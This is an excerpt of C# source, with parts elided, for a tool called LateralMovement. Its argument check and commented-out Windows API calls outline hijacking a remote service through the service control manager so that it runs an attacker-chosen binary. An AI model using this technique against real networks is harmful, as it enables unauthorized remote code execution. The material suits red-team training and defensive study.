...
namespace LateralMovement
{
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: LateralMovement.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("Example: LateralMovement.exe appsrv01 SensorService notepad.exe");
                return;
            }

            // Open remote SCManager
            // String target = "DC02";
            // IntPtr SCMHandle = OpenSCManager(target, null, SC_MANAGER_ALL_ACCESS);
            ...
            // IntPtr schService = OpenService(SCMHandle, ServiceName, SERVICE_ALL_ACCESS);
            ...
            // bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, Payload, null, null, null, null, null, null);
